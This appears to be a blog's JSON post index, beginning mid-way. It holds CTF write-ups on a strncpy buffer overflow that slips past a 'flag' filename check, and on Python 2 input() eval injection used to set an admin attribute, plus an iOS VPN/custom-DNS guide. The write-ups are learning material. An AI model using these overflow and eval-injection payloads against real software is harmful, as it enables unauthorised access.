} } } Clues We can search for places where the “flag” string is giving us grief, and we find this if statement: if (strstr(command_arg, \"flag\") != NULL) { \tprintf(\"Invalid argument: %s\\n\", command_arg); \tcontinue; } So, what can we learn about command_arg? Well for starters, it’s declared right near a bunch of other memory variables: char command_line[512] = {0}; char command_arg[512 - 16] = {0}; char command_name[16] = {0}; If you know about buffer overflows, we have a promising target. So how does the value in these variables get loaded? Well, just below, you can see they get zeroed out, but the comments confirm that this should be our target: // Fully zero inputs. Our strncpy's below will rely on this. memset(command_line, 0, sizeof(command_line)); memset(command_arg, 0, sizeof(command_arg)); memset(command_name, 0, sizeof(command_name)); While not as bad as strcpy, strncpy can still give us lots of options. In the case of this program, strncpy is used with a dynamic value of n, and even worse, it’s a value we can control since it’s the length of command_name: strncpy(command_name, command_line, arg_start ? (arg_start - command_line) : (sizeof(command_name) - 1)); The above of code is vulnerable to a buffer overflow. Based on the where the memory was declared earlier, we can predict that if command_name is longer than 16 characters, the extra characters will begin to overwrite command_arg. This happens after command_arg is inspected for the “flag” string, so this could allow us to rewrite the file name after the check. Because the program outputs the name of a file if it doesn’t find it, we can test what the runtime file name is: int file = forest_open(state, path, O_RDONLY); if (file &lt; 0) { printf(\"Could not open file: %s\\n\", path); return; } So let’s test if we can add something to the command name and have things work as expected: read doesnotexist.txt Could not open file: doesnotexist.txt read0 doesnotexist.txt Could not open file: doesnotexist.txt read00000 doesnotexist.txt Could not open file: doesnotexist.txt This confirms that the command name, read is still parsed correctly even if we add something to it. Now we can increment the extension until something breaks. We should expect something between ten and twenty extra characters, based on the size of the read000000000000000 doesnotexist.txt Could not open file: 000snotexist.txt Bingo! We have confirmed that a buffer overflow is possible. Now, since the string “flag” is four characters long, let’s shorten the file name to 4 characters and try to overflow the buffer. Since we got three characters to overwrite the file name in our previous try, let’s replace the last three zero’s with “fla” and add a “g”. read000000000000flag summ.txt hackpackCTF{...} Victory! Solution Use the fileforest binary’s read command with an input that overflows the buffer so that you bypass the “flag” check but still execute read flag.txt. read000000000000flag summ.txt hackpackCTF{...} " }, { "title": "HackPackCTF 2025: WeAreGreenLLC", "url": "/posts/HackPackCTF-WeAreGreenLLC/", "categories": "CTF", "tags": "HackPackCTF", "date": "2025-05-01 04:00:00 -0400", "content": " Category: PWN Difficulty: Easy Points: 500 Below is the full source code provided for the challenge: from os import getenv import re from sys import stdout import __builtin__ import inspect SECRET = getenv('SECRET', 'SECRET{THIS_IS_NOT_A_FLAG}') # Step 2: Disable all imports def blocked_import(name, *args, **kwargs): raise ImportError(\"All imports are disabled.\") __builtin__.__import__ = blocked_import # Step 3: Disable all dangerous functions __builtin__.__dict__['execFile'] = None __builtin__.__dict__['compile'] = None __builtin__.__dict__['exec'] = None __builtin__.__dict__['eval'] = None __builtin__.__dict__['open'] = None __builtin__.__dict__['reload'] = None class User: def __init__(self, name): self.name = name def secured_attribute_update(self, key, value, secret): if not isinstance(secret, str): raise TypeError(\"Only string literals are allowed!\") # Inspect the caller's frame for global variables caller_globals = inspect.currentframe().f_back.f_globals # Check if the argument references any global object (like a dict) for var_name, var_value in caller_globals.items(): if id(secret) == id(var_value): # Compare object identities raise ValueError(\"Global variables are not allowed as arguments!\") if secret != SECRET: print(\"Woah! Wrong secret! You are not allowed to do that!\") stdout.flush() return setattr(self, key, value) print(\"Existing attribute updated successfully!\") stdout.flush() def __repr__(self): return \"User: \" + self.name def main(): user = User(\"Player\") print(\"Welcome,\", user) while True: try: print(\"Do you want the flag? (y/n)\") stdout.flush() user_input = raw_input() if user_input == \"y\": print(\"You need the secret to get the flag! What's the secret? \") stdout.flush() secret = input() if secret == SECRET: print(\"Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) \") stdout.flush() is_admin = raw_input() if is_admin == \"y\": if user.is_admin == True: match = re.search(r'SECRET{(.*?)}', SECRET) if match: flag_key = match.group(1) print(getenv(flag_key)) stdout.flush() else: print(\"You are not allowed to do that!\") stdout.flush() else: print(\"You Liar! You are not an admin! Try again!\") stdout.flush() else: print(\"I will allow you to try until you become an admin!\") stdout.flush() else: print(\"Oops! Wrong secret! Try again!\") stdout.flush() else: print(str.format(\"{user.name} said: \" + user_input + \" - Means, you don't want the flag! No worries, you can try again!\", user=user)) stdout.flush() except Exception as e: print(\"You are not allowed to do that!\") stdout.flush() if __name__ == \"__main__\": main() Clues Obviously we should work through the various prompts and checks to reach a state where the program will simply give us the flag. How could we manipulate secret? Notice the distinction between raw_input() and input(). In python 2, input() results are evaluated as code, and the presence of __builtin__ instead of builtin tells us this is python 2. We’ll know we succeeded if we get the “oops” message printed out: Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) Alright, so we can manipulate secret. The next check is whether user.is_admin is True. Here, a clue lies above. in secured_attribute_update(), setattr() is used to change a local attribute. Could this work for us? According to Python Documentation, setattr(x, ‘foobar’, 123) is equivalent to x.foobar = 123 Let’s try it: You need the secret to get the flag! What's the secret? setattr(user, 'is_admin', True) Oops! Wrong secret! Try again! Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y hackpackCTF{...} Bingo! Solution Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y You are not allowed to do that! Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? setattr(user, 'is_admin', True) Oops! Wrong secret! Try again! Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y hackpackCTF{...} Which we can shorten to: Do you want the flag? (y/n) y You need the secret to get the flag! What's the secret? setattr(user, 'is_admin', True) or SECRET Oops! You still need to get Admin access! Are you admin 'yet'? (y/n) y hackpackCTF{...} " }, { "title": "VPN with Custom DNS on iOS Using Passepartout", "url": "/posts/VPN-with-Custom-DNS-on-iOS-Using-Passepartout/", "categories": "Privacy", "tags": "VPN, DNS, iOS", "date": "2025-04-24 04:00:00 -0400", "content": "iOS has excellent support for VPNs and custom DNS servers, but what about both at the same time? This article explains reasons to use a VPN and custom DNS, as well as the solution to use both on iOS via an app called Passepartout. Why to use a VPN VPNs (Virtual Private Networks) are a foundational tool in any privacy and security arsenal. VPNs have three primary utilities: Hiding traffic from intermediary third-parties Hiding your true IP from the sites you visit and apps you use Connecting private networks without exposing between traffic VPNs work by negotiation a connection between two computers, typically your laptop/smartphone and a VPN server, then routing all traffic through that connection in an unreadable way. This means that your internet service provider or work wi-fi cannot see what websites you’re visiting. Additionally, it means the websites you’re visiting don’t know what network you’re actually connecting from; they only see the VPN address. Let’s consider a scenario. Say you access your email without using a VPN, and your internet address is 1.2.3.4. If you’re the only one who uses 1.2.3.4, then your email can include that information in a profile about you, and sell that at their discretion. Then, a month later, you visit DivorceLawyers.com using the same address, 1.2.3.4. See the trouble? Additionally, my internet provider can see what websites I visit, and they would know I visited DivorceLawyers.com, and they can sell that information at their discretion. What if we used a VPN instead? I access my email, and the internet address is a random address from a huge pool of addresses the VPN server can use. Maybe 5.6.7.8 one day, maybe 9.10.11.12 another day, etc. Now, if I visit DivorceLawyers.com, my internet address of 56.12.48.192 could be any user of the same VPN service, of which there could be tens or hundreds of thousands of people. Additionally, because my traffic is unreadable until it gets to the VPN server, my internet provider only sees random garbled Klingon nonsense, instead of seeing DivorceLawyers.com. VPNs are not a magic bullet in the privacy world. Advertisers and data brokers are always inventing clever new ways to watch you online. That said, a VPN is an important piece in the grand privacy puzzle. Why to use Custom DNS DNS (Domain Name System) is a core part of how the internet works. When you type in DivorceLawyers.com, how does your computer know where to go? The answer is DNS. The DNS system allows computers to look up the corresponding internet addresses when given a domain name, like wtthomas.org, divorcelawyers.com, or google.com. The owner of the domain can specify what internet address should be used, and can change it as needed. This means us humans don’t have to memorize crazy numbers like 14.12.58.124, we can just memorize amazon.com. Most computers use the default DNS specified by their network router, usually Google, Microsoft, Cloudflare, or some other huge tech company. But we have other options, and privacy enthusiasts can obtain major benefits from using custom DNS services that give us control over how this system works on our computers. For all the same reasons that Amazon or Google use DNS, trackers and advertisers also rely on the DNS system to keep their systems functioning. For example, when you load a webpage that uses Google Analytics to track you, your computer will query googleanalytics.com to get the internet address so it knows where to send the tracking information. So… what if it never got a response? What if your computer did not receive the internet address for googleanalystics.com? It would have no idea where to send the tracking information, and thus, the attempt to watch you online is foiled. However, this has been possible for a long time using popular browser extensions that stop the trackers from loading. What makes custom DNS special is that it doesn’t just apply to your browser, it applies to your entire computer, or even your entire network. Custom DNS can even be used as an effective parental control to stop entire apps from working, even if the DNS isn’t configured on a specific computer. The Challenge on iOS Given all the discussion above, privacy enthusiasts should be excited to load custom DNS and a VPN on their mobile devices. Most Android smartphones make this easy, but Apple mobile devices present some obstacles. Let’s take ProtonVPN and NextDNS, both highly popular services in their categories, for this example. If I install the NextDNS configuration profile using their installation instructions, everything works great! Additionally, if I install the ProtonVPN iOS app, it also works great. However, when I activate my VPN, I drop out of my custom DNS configuration. Why? Most VPNs override your default DNS settings. For all the reasons I covered, DNS can be used to track what websites you’re visiting. If you’re using a VPN, but you’re also using Google DNS, then Google can still see what websites you’re visiting based on your DNS queries, even if the traffic is unreadable. So, VPNs overwrite this to use their own DNS servers to prevent tracking. This is great by default, but we don’t have any control or visibility into those DNS servers. While some apps like ProtonVPN offer tracking blockers via their DNS, there’s no control or granularity, just a On/Off toggle. If I need to temporarily turn off my “tracking protection” to make a site load, I have to turn all of my DNS protection off, not just whitelist the needed domain. Enter Passepartout After much testing and head-scratching, I found Passepartout about two years ago. After a rock-solid two years, I am comfortable recommending Passerpartout as the solution to the problem of custom DNS and VPNs on iOS. Below is a tutorial on how to set up Passepartout using ProtonVPN and NextDNS. In the top right hand corner, tap the plus sign and choose &gt;Provider&gt;ProtonVPN&gt;OpenVPN. Next, tap Add module and click DNS Then, tap on the newly added DNS module to change the settings. Change Protocol to Over HTTPS and add the URL provided by NextDNS. Change Route through VPN to Yes. Tap Add address under SERVERS and add the two internet addresses provided by NextDNS. If you want to report the device name, you can optionally add a forward slash and a name to the URL. The above steps should be universal regardless of VPN provider. The steps below show the remaining configuration required to use OpenVPN via ProtonVPN. The steps below will be different depending whether your VPN provider allows outside-the-app VPN connections and how they choose to supply the credentials. Navigate to https://account.protonvpn.com/account-password#openvpn, or log in to ProtonVPN in your browser and find the Account menu in the top-left corner. Scroll down until you find the OpenVPN / IKEv2 username. This is the username/password that you will use for Passepartout. This is also where you will reset those credentials if you suspect they’ve been compromised (or on a regular basis if you want better security hygiene). There are some additional configurations I recommend, such as excluding mobile data from the VPN connection to save data, but I’ll leave you to test your setup and make quality-of-life changes as you see fit. Make sure you have the normal NextDNS configuration profile installed if you create exceptions for the VPN. If your VPN fails or intentionally disconnects, iOS will fall back to this profile and keep your DNS filtered like normal. " }, { "title": "Welcome", "url": "/posts/Welcome/", "categories": "", "tags": "", "date": "2025-04-19 04:00:00 -0400", "content": "Welcome to my blog! This is a test post. Posts should have full markdown capability, with excellent display characteristics for code blocks and alerts/prompts. Here’s some code: for(int i = 0; i &lt; 5; i++) { System.out.println(\"Hello world.\"); } Here’s some prompts: You can do tip level. You can do info level. You can do warning level. You can do danger level. There’s also support for images, videos, tables, and basically anything else Markdown supports. Onward! " } ]
